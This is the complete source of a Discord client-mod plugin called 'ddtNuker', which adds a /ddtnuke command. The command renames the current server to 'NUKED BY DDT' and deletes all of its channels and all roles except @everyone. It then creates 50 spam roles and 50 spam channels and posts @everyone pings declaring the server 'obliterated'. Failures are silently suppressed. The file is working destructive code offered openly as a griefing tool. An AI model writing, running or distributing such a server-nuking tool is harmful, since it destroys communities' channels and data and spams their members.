import { ApplicationCommandInputType, sendBotMessage } from "@api/Commands";
import definePlugin from "@utils/types";
import { RestAPI, GuildStore, ChannelStore } from "@webpack/common";

export default definePlugin({
    name: "ddtNuker",
    description: "Server Obliterator Panel. Adds /ddtnuke command. USE WITH EXTREME CAUTION.",
    authors: [{ id: 1n, name: "Asrar" }],
    tags: ["Fun", "Commands"],
    enabledByDefault: false,

    commands: [{
        name: "ddtnuke",
        description: "Completely obliterate the current server (Requires Admin)",
        inputType: ApplicationCommandInputType.BUILT_IN,
        execute(_, { channel }) {
            const guildId = channel.guild_id;
            if (!guildId) {
                return sendBotMessage(channel.id, { content: "You can only nuke servers, not DMs." });
            }

            const guild = GuildStore.getGuild(guildId);
            
            sendBotMessage(channel.id, { 
                content: `☢️ **NUCLEAR PROTOCOL INITIATED** ☢️\nTarget: **${guild.name}**\nPhase 1: Annihilation\nPhase 2: Reconstruction` 
            });
            
            setTimeout(async () => {
                // PHASE 5: Server Vandalism
                RestAPI.patch({ 
                    url: `/guilds/${guildId}`, 
                    body: { name: "NUKED BY DDT", description: "Phantom Protocol Engaged." } 
                }).catch(() => {});

                // PHASE 1: Total Destruction
                const channels = Object.values(ChannelStore.getMutableGuildChannelsForGuild(guildId));
                channels.forEach((c: any) => {
                    RestAPI.del({ url: `/channels/${c.id}` }).catch(() => {});
                });

                const roles = Object.values(GuildStore.getRoles(guildId) || {});
                roles.forEach((r: any) => {
                    if (r.name !== "@everyone") {
                        RestAPI.del({ url: `/guilds/${guildId}/roles/${r.id}` }).catch(() => {});
                    }
                });
                
                // PHASE 2: Spam Reconstruction
                for (let i = 1; i <= 50; i++) {
                    // Create Spam Roles
                    RestAPI.post({
                        url: `/guilds/${guildId}/roles`,
                        body: { name: `DESTROYED-${i}`, color: Math.floor(Math.random() * 16777215), hoist: true }
                    }).catch(() => {});

                    // Create Spam Channels & Ping
                    RestAPI.post({
                        url: `/guilds/${guildId}/channels`,
                        body: { type: 0, name: `nuked-${i}` }
                    }).then((res: any) => {
                        if (res.body && res.body.id) {
                            RestAPI.post({
                                url: `/channels/${res.body.id}/messages`,
                                body: { content: "@everyone ☢️ SERVER NUKED BY DDT CLIENT ☢️\nPhantom Protocol Engaged. You have been obliterated." }
                            }).catch(() => {});
                        }
                    }).catch(() => {});
                }
            }, 2000);
        }
    }]
});
